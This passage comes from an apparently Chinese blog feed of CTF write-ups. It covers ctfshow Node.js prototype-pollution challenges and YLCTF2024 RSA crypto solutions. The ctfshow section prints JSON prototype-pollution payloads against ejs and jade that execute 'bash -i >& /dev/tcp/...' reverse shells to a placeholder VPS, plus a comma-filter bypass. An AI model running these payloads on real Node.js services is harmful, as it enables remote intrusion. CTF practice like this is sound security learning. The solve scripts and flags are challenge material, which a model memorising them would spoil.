class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs json">var express = require(&#x27;express&#x27;);<br>var router = express.Router();<br>var utils = require(&#x27;../utils/common&#x27;);<br><br><span class="hljs-comment">/* GET home page.  */</span><br>router.post(&#x27;/&#x27;<span class="hljs-punctuation">,</span> require(&#x27;body-parser&#x27;).json()<span class="hljs-punctuation">,</span>function(req<span class="hljs-punctuation">,</span> res<span class="hljs-punctuation">,</span> next) <span class="hljs-punctuation">&#123;</span><br>  res.type(&#x27;html&#x27;);<br>  var user = new function()<span class="hljs-punctuation">&#123;</span><br>    this.userinfo = new function()<span class="hljs-punctuation">&#123;</span><br>    this.isVIP = <span class="hljs-literal"><span class="hljs-keyword">false</span></span>;<br>    this.isAdmin = <span class="hljs-literal"><span class="hljs-keyword">false</span></span>;<br>    this.isAuthor = <span class="hljs-literal"><span class="hljs-keyword">false</span></span>;     <br>    <span class="hljs-punctuation">&#125;</span>;<br>  <span class="hljs-punctuation">&#125;</span>;<br>  utils.copy(user.userinfo<span class="hljs-punctuation">,</span>req.body);<br>  if(user.userinfo.isAdmin)<span class="hljs-punctuation">&#123;</span><br>    return res.json(<span class="hljs-punctuation">&#123;</span>ret_code<span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> ret_msg<span class="hljs-punctuation">:</span> &#x27;登录成功&#x27;<span class="hljs-punctuation">&#125;</span>);  <br>  <span class="hljs-punctuation">&#125;</span>else<span class="hljs-punctuation">&#123;</span><br>    return res.json(<span class="hljs-punctuation">&#123;</span>ret_code<span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span> ret_msg<span class="hljs-punctuation">:</span> &#x27;登录失败&#x27;<span class="hljs-punctuation">&#125;</span>);  <br>  <span class="hljs-punctuation">&#125;</span><br>  <br><span class="hljs-punctuation">&#125;</span>);<br><br>module.exports = router;<br></code></pre></td></tr></table></figure><p>本题的预期解就是339的非预期解，但是需要再套一层原型就可以打通了</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;outputFunctionName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/vps-ip/port 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>也是/login的post发包，然后随便的post访问，vps里输入env得到flag</p><h3 id="ctfshow-web342343"><a class="markdownIt-Anchor" href="#ctfshow-web342343"></a> ctfshow web342&amp;343</h3><p>这题考察的是jade rce</p><p><a href="https://xz.aliyun.com/t/7025?time__1311=n4+xnD0Dy7itGQ=47KDsA3rZztG=zDBYf7rYD#toc-1">再探 JavaScript 原型链污染到 RCE - 先知社区 (aliyun.com)</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Block&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;nodes&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;compileDebug&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;self&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;line&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxxxxxxxxxx/5566 0&gt;&amp;1\&quot;&#x27;)&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="ctfshow-web344"><a class="markdownIt-Anchor" href="#ctfshow-web344"></a> ctfshow web344</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs json">router.get(&#x27;/&#x27;<span class="hljs-punctuation">,</span> function(req<span class="hljs-punctuation">,</span> res<span class="hljs-punctuation">,</span> next) <span class="hljs-punctuation">&#123;</span><br>  res.type(&#x27;html&#x27;);<br>  var flag = &#x27;flag_here&#x27;;<br>  if(req.url.match(/<span class="hljs-number">8</span>c|<span class="hljs-number">2</span>c|\<span class="hljs-punctuation">,</span>/ig))<span class="hljs-punctuation">&#123;</span><br>  res.end(&#x27;where is flag <span class="hljs-punctuation">:</span>)&#x27;);<br>  <span class="hljs-punctuation">&#125;</span><br>  var query = JSON.parse(req.query.query);<br>  if(query.name===&#x27;admin&#x27;&amp;&amp;query.password===&#x27;ctfshow&#x27;&amp;&amp;query.isVIP===<span class="hljs-literal"><span class="hljs-keyword">true</span></span>)<span class="hljs-punctuation">&#123;</span><br>  res.end(flag);<br>  <span class="hljs-punctuation">&#125;</span>else<span class="hljs-punctuation">&#123;</span><br>  res.end(&#x27;where is flag. <span class="hljs-punctuation">:</span>)&#x27;);<br>  <span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-punctuation">&#125;</span>);<br></code></pre></td></tr></table></figure><p>过滤了逗号已经他的url编码</p><p>要传<code>?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;ctfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</code></p><p>都进行url编码就行了</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">?query=<span class="hljs-meta">%</span><span class="hljs-number">7</span>b<span class="hljs-meta">%</span><span class="hljs-number">22</span><span class="hljs-meta">%</span><span class="hljs-number">6</span>e<span class="hljs-meta">%</span><span class="hljs-number">61</span><span class="hljs-meta">%</span><span class="hljs-number">6</span>d<span class="hljs-meta">%</span><span class="hljs-number">65</span><span class="hljs-meta">%</span><span class="hljs-number">22</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>a<span class="hljs-meta">%</span><span class="hljs-number">22</span><span class="hljs-meta">%</span><span class="hljs-number">61</span><span class="hljs-meta">%</span><span class="hljs-number">64</span><span class="hljs-meta">%</span><span class="hljs-number">6</span>d<span class="hljs-meta">%</span><span class="hljs-number">69</span><span class="hljs-meta">%</span><span class="hljs-number">6</span>e<span class="hljs-meta">%</span><span class="hljs-number">22</span>&amp;query=<span class="hljs-meta">%</span><span class="hljs-number">22</span><span class="hljs-meta">%</span><span class="hljs-number">70</span><span class="hljs-meta">%</span><span class="hljs-number">61</span><span class="hljs-meta">%</span><span class="hljs-number">73</span><span class="hljs-meta">%</span><span class="hljs-number">73</span><span class="hljs-meta">%</span><span class="hljs-number">77</span><span class="hljs-meta">%</span><span class="hljs-number">6</span>f<span class="hljs-meta">%</span><span class="hljs-number">72</span><span class="hljs-meta">%</span><span class="hljs-number">64</span><span class="hljs-meta">%</span><span class="hljs-number">22</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>a<span class="hljs-meta">%</span><span class="hljs-number">22</span><span class="hljs-meta">%</span><span class="hljs-number">63</span><span class="hljs-meta">%</span><span class="hljs-number">74</span><span class="hljs-meta">%</span><span class="hljs-number">66</span><span class="hljs-meta">%</span><span class="hljs-number">73</span><span class="hljs-meta">%</span><span class="hljs-number">68</span><span class="hljs-meta">%</span><span class="hljs-number">6</span>f<span class="hljs-meta">%</span><span class="hljs-number">77</span><span class="hljs-meta">%</span><span class="hljs-number">22</span>&amp;query=<span class="hljs-meta">%</span><span class="hljs-number">22</span><span class="hljs-meta">%</span><span class="hljs-number">69</span><span class="hljs-meta">%</span><span class="hljs-number">73</span><span class="hljs-meta">%</span><span class="hljs-number">56</span><span class="hljs-meta">%</span><span class="hljs-number">49</span><span class="hljs-meta">%</span><span class="hljs-number">50</span><span class="hljs-meta">%</span><span class="hljs-number">22</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>a<span class="hljs-meta">%</span><span class="hljs-number">74</span><span class="hljs-meta">%</span><span class="hljs-number">72</span><span class="hljs-meta">%</span><span class="hljs-number">75</span><span class="hljs-meta">%</span><span class="hljs-number">65</span><span class="hljs-meta">%</span><span class="hljs-number">7</span>d<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>学习文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>node.js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>YLCTF2024</title>
    <link href="/2024/10/17/ylctf/ylctf2024/"/>
    <url>/2024/10/17/ylctf/ylctf2024/</url>
    
    <content type="html"><![CDATA[<p>前言:总排23，新生赛道11</p><h3 id="round-1"><a class="markdownIt-Anchor" href="#round-1"></a> Round 1</h3><h4 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> crypto</h4><h5 id="round1break"><a class="markdownIt-Anchor" href="#round1break"></a> [round1]BREAK</h5><p>e有范围，由于e的范围不算大，可以进行爆破得到e，求出d,解出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert, gcd<br><br>p = <span class="hljs-number">112201812592436732390795120344111949417282805598314874949132199714697698933980025001138515893011073823715376332558632580563147885418631793000008453933543935617128269371275964779672888059389120797503550397834151733721290859419396400302434404551112484195071653351729447294368676427327217463094723449293599543541</span><br>q = <span class="hljs-number">177020901129489152716203177604566447047904210970788458377477238771801463954823395388149502481778049515384638107090852884561335334330598757905074879935774091890632735202395688784335456371467073899458492800214225585277983419966028073512968573622161412555169766112847647015717557828009246475428909355149575012613</span><br>c = <span class="hljs-number">2924474039245207571198784141495689937992753969132480503242933533024162740004938423057237165017818906240932582715571015311615140080805023083962661783117059081563515779040295926885648843373271315827557447038547354198633841318619550200065416569879422309228789074212184023902170629973366868476512892731022218074481334467704848598178703915477912059538625730030159772883926139645914921352787315268142917830673283253131667111029720811149494108036204927030497411599878456477044315081343437693246136153310194047948564341148092314660072088671342677689405603317615027453036593857501070187347664725660962477605859064071664385456</span><br><br>n = p * q<br><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_primes</span>(<span class="hljs-params">start, end</span>):<br>    primes = []<br>    <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start, end + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> isPrime(num):<br>            primes.append(num)<br>    <span class="hljs-keyword">return</span> primes<br><br><span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> generate_primes(<span class="hljs-number">55555</span>, <span class="hljs-number">66666</span>):<br>    <span class="hljs-keyword">if</span> gcd(e, phi) == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">try</span>:<br>            d = invert(e, phi)<br>            m = <span class="hljs-built_in">pow</span>(c, d, n)<br><br>           <br>            flag = long_to_bytes(m).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;找到 e = <span class="hljs-subst">&#123;e&#125;</span>, 解密后的 flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">break</span>  <br>        <span class="hljs-keyword">except</span> ZeroDivisionError:<br>            <span class="hljs-keyword">continue</span>  <span class="hljs-comment"># 如果 invert 失败，则继续尝试下一个 e</span><br>        <span class="hljs-keyword">except</span> UnicodeDecodeError:<br>            <span class="hljs-keyword">continue</span>  <span class="hljs-comment"># 如果解码失败，则继续尝试下一个 e</span><br><br><span class="hljs-comment"># YLCTF&#123;fbb6186c-6603-11ef-ba80-deb857dc15be&#125;</span><br></code></pre></td></tr></table></figure><h5 id="round1signrsa"><a class="markdownIt-Anchor" href="#round1signrsa"></a> [round1]signrsa</h5><p>RSA 模数 n1 和 n2 之间有公因子 q，从而使得可以分别对这两个模数进行分解，然后使用对应的私钥对密文进行解密，通过共模攻击解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>n1 = <span class="hljs-number">18674375108313094928585156581138941368570022222190945461284402673204018075354069827186085851309806592398721628845336840532779579197302984987661547245423180760958022898546496524249201679543421158842103496452861932183144343315925106154322066796612415616342291023962127055311307613898583850177922930685155351380500587263611591893137588708003711296496548004793832636078992866149115453883484010146248683416979269684197112659302912316105354447631916609587360103908746719586185593386794532066034112164661723748874045470225129298518385683561122623859924435600673501186244422907402943929464694448652074412105888867178867357727</span><br>n2 = <span class="hljs-number">20071978783607427283823783012022286910630968751671103864055982304683197064862908267206049336732205051588820325894943126769930029619538705149178241710069113634567118672515743206769333625177879492557703359178528342489585156713623530654319500738508146831223487732824835005697932704427046675392714922683584376449203594641540794557871881581407228096642417744611261557101573050163285919971711214856243031354845945564837109657494523902296444463748723639109612438012590084771865377795409000586992732971594598355272609789079147061852664472115395344504822644651957496307894998467309347038349470471900776050769578152203349128951</span><br>e = <span class="hljs-number">65537</span><br>q = gmpy2.gcd(n1,n2)<br><span class="hljs-built_in">print</span>(q)<br><span class="hljs-comment"># 10210039189276167395636779557271057346691950991057423589319031237857569595284598319093522326723650646963251941930167018746859556383067696079622198265424441</span><br><br>p1 = n1 // q<br>p2 = n2 // q<br><br>d1 = gmpy2.invert(e,(q-<span class="hljs-number">1</span>)*(p1-<span class="hljs-number">1</span>))<br>d2 = gmpy2.invert(e,(q-<span class="hljs-number">1</span>)*(p2-<span class="hljs-number">1</span>))<br><br>c = <span class="hljs-number">17087345023822081623891751423634072935359933429883025338799316908134539732911987403379813791051721409025872046014445468757120127961953783792146805906255385927316168869306218712056692227481252348951991457948040258007096536015704568840248330993815252823424627958278346871867901249369170134106070695916355118499922945313335801615652226556995849239616859826762866841805915253356402366997693599487016453619500217382302173033771577307792501865322742699412806457301297719922487797626724702793650939979227432331932830374740050145956182452965260035182810782721888226896944881610943610565496963461471122317296063535420461202109</span><br>m = <span class="hljs-built_in">pow</span>(c,d2,n2)<br>m = <span class="hljs-built_in">pow</span>(m,d1,n1)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment"># b&#x27;YLCTF&#123;6567543c-e55b-4563-96ea-e7412e6834c2&#125;\n&#x27;</span><br></code></pre></td></tr></table></figure><h5 id="round1ezrsa"><a class="markdownIt-Anchor" href="#round1ezrsa"></a> [round1]ezrsa</h5><p>也是类共模攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, inverse<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> gcd<br><br>hint = <span class="hljs-number">74749248594786596691182255254760227675255640419811402596325257219264047909491854266322448991637721043565574231631858096560042784343181104155107927958136483921037567399591407065870395299938514992590953052021824859260647798407649617552126176876304021384535351268838294566489926141346712140945311688664783400430</span><br>n = <span class="hljs-number">146150746308368977558105420785404636106107297097656606561134260305844960246816673265377081884447744494438593580830134146856713782255534506122943914554490808124199966427121519694676728571857729213721192818898378912680306144869946238782714021401494162427357692727211780506245166118326256365562777182481342235649</span><br>c = <span class="hljs-number">12817272835509631426126672293486991243028800172545793296231214648592002361121076145968763436527652893903622692932403498323802323146995559960945697843044017192966527560462131618029760025950956635249851792561073659666145624864040328809279977987225518572316396679320621448299428750551755789817002220213790188515</span><br>e = <span class="hljs-number">65537</span><br><br>p = gcd(<span class="hljs-built_in">pow</span>(<span class="hljs-number">20240918</span>, e, n) - hint, n)<br>q = n // p<br><br>d = inverse(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))<br>flag = long_to_bytes(<span class="hljs-built_in">pow</span>(c, d, n))<br><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment"># b&#x27;YLCTF&#123;12f142fc-351d-486f-aaa6-b64ebf3e7bdf&#125;\n&#x27;</span><br></code></pre></td></tr></table></figure><h5 id="round1ra3"><a class="markdownIt-Anchor" href="#round1ra3"></a> [round1]r(A)=3</h5><p>典型的矩阵问题，进行交互循环300次得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>p = remote(<span class="hljs-string">&#x27;challenge.yuanloo.com&#x27;</span>, <span class="hljs-number">23115</span>)<br><br><span class="hljs-keyword">for</span> attempt <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Attempt <span class="hljs-subst">&#123;attempt + <span class="hljs-number">1</span>&#125;</span>...&quot;</span>)  <br><br>        line = p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>.encode())<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Received: <span class="hljs-subst">&#123;line.decode().strip()&#125;</span>&quot;</span>)<br><br>        line = p.recvuntil(<span class="hljs-string">&quot;x=&quot;</span>.encode())<br>        equation_str = line.decode().strip()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Received: <span class="hljs-subst">&#123;equation_str&#125;</span>&quot;</span>)<br><br>        equations = equation_str.split(<span class="hljs-string">&quot;\n&quot;</span>)<br>        A = []<br>        B = []<br><br>        <span class="hljs-keyword">for</span> i, eq <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(equations):<br>            <span class="hljs-keyword">if</span> i == <span class="hljs-built_in">len</span>(equations) - <span class="hljs-number">1</span>:  <span class="hljs-comment"># 忽略最后一行</span><br>                <span class="hljs-keyword">continue</span><br>            left, right = eq.split(<span class="hljs-string">&quot;=&quot;</span>)<br>            B.append(<span class="hljs-built_in">float</span>(right.strip()))<br><br>            <span class="hljs-comment"># 提取系数</span><br>            coefficients = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]  <span class="hljs-comment"># 对应 x, y, z 的系数</span><br>            <span class="hljs-keyword">for</span> term <span class="hljs-keyword">in</span> left.split(<span class="hljs-string">&quot;+&quot;</span>):<br>                term = term.strip()<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;x&quot;</span> <span class="hljs-keyword">in</span> term:<br>                    coefficients[<span class="hljs-number">0</span>] = <span class="hljs-built_in">float</span>(term.split(<span class="hljs-string">&quot;*&quot;</span>)[<span class="hljs-number">0</span>]) <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;*&quot;</span> <span class="hljs-keyword">in</span> term <span class="hljs-keyword">else</span> <span class="hljs-number">1.0</span><br>                <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;y&quot;</span> <span class="hljs-keyword">in</span> term:<br>                    coefficients[<span class="hljs-number">1</span>] = <span class="hljs-built_in">float</span>(term.split(<span class="hljs-string">&quot;*&quot;</span>)[<span class="hljs-number">0</span>]) <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;*&quot;</span> <span class="hljs-keyword">in</span> term <span class="hljs-keyword">else</span> <span class="hljs-number">1.0</span><br>                <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;z&quot;</span> <span class="hljs-keyword">in</span> term:<br>                    coefficients[<span class="hljs-number">2</span>] = <span class="hljs-built_in">float</span>(term.split(<span class="hljs-string">&quot;*&quot;</span>)[<span class="hljs-number">0</span>]) <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;*&quot;</span> <span class="hljs-keyword">in</span> term <span class="hljs-keyword">else</span> <span class="hljs-number">1.0</span><br><br>            A.append(coefficients)<br><br>        A = np.array(A)<br>        B = np.array(B)<br><br>        solution = np.linalg.solve(A, B)<br><br>        <br>        p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(solution[<span class="hljs-number">0</span>])))  <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;solution[<span class="hljs-number">0</span>]&#125;</span>&quot;</span>)<br>        line = p.recvuntil(<span class="hljs-string">&quot;y=&quot;</span>.encode())<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Received: <span class="hljs-subst">&#123;line.decode().strip()&#125;</span>&quot;</span>)<br>        p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(solution[<span class="hljs-number">1</span>])))  <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;solution[<span class="hljs-number">1</span>]&#125;</span>&quot;</span>)<br>        line = p.recvuntil(<span class="hljs-string">&quot;z=&quot;</span>.encode())<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Received: <span class="hljs-subst">&#123;line.decode().strip()&#125;</span>&quot;</span>)<br>        p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(solution[<span class="hljs-number">2</span>])))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;solution[<span class="hljs-number">2</span>]&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Attempt <span class="hljs-subst">&#123;attempt + <span class="hljs-number">1</span>&#125;</span> failed: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h5 id="round1threecry"><a class="markdownIt-Anchor" href="#round1threecry"></a> [round1]threecry</h5><p>参考文章<a href="https://blog.csdn.net/luochen2436/article/details/131948093">https://blog.csdn.net/luochen2436/article/details/131948093</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>e = <span class="hljs-number">0xe18e</span><br>crypto05= <span class="hljs-number">16623038441079077059861502314553840945014390827451667324209537222817794990697456726185616589892380248771957751215156366431853682717356212256182541599038824352426429058283605462766315213017886613935143369630579915129950428539117781616821575904280675596170305716041161748779293269633614559889401304768245038227061</span><br>crypto03= <span class="hljs-number">7370478569029817135349016311298954172270465460003018672225010525611372855698643108316167758095660953716705265165460646442696451806405620591202977137450538604803993325516057226246866037605963589652887018894515430484657967483718879717967258257252134148706147029651520914313120373591263784166639605955378617102045</span><br>number1 = <span class="hljs-number">6035830951309638186877554194461701691293718312181839424149825035972373443231514869488117139554688905904333169357086297500189578624512573983935412622898726797379658795547168254487169419193859102095920229216279737921183786260128443133977458414094572688077140538467216150378641116223616640713960883880973572260683</span><br>number2 = <span class="hljs-number">20163906788220322201451577848491140709934459544530540491496316478863216041602438391240885798072944983762763612154204258364582429930908603435291338810293235475910630277814171079127000082991765275778402968190793371421104016122994314171387648385459262396767639666659583363742368765758097301899441819527512879933947</span><br><br>a_near = gmpy2.iroot(number2//<span class="hljs-number">325</span>,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">while</span> number2 % gmpy2.next_prime(<span class="hljs-number">13</span>*a_near)!=<span class="hljs-number">0</span>:<br>    a_near = gmpy2.next_prime(a_near)<br>p = gmpy2.next_prime(<span class="hljs-number">13</span>*a_near)<br>q = number2//p<br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>t = gmpy2.gcd(e, phi)<br>d = gmpy2.invert(e // t, phi)<br>m2 = gmpy2.iroot(<span class="hljs-built_in">pow</span>(crypto05, d, number2), t)[<span class="hljs-number">0</span>]<br>flag2 = long_to_bytes(m2)<br><br>d1 = gmpy2.invert(number1, phi)<br>m1 = <span class="hljs-built_in">pow</span>(crypto03, d1, number2)<br>flag1 = long_to_bytes(m1)<br><span class="hljs-built_in">print</span>(flag1 + flag2)<br><span class="hljs-comment"># b&#x27;YLCTF&#123;8d547f68-f394-4254-9ada-2dc306862b66&#125;\n&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h4><h5 id="签到-打卡小能手"><a class="markdownIt-Anchor" href="#签到-打卡小能手"></a> [签到] 打卡小能手</h5><p><img src="/../../images/ylctf/2024/%E6%89%93%E5%8D%A1%E5%B0%8F%E5%8A%A9%E6%89%8B.png" alt="打卡小助手"></p><h5 id="round-1-hide_png"><a class="markdownIt-Anchor" 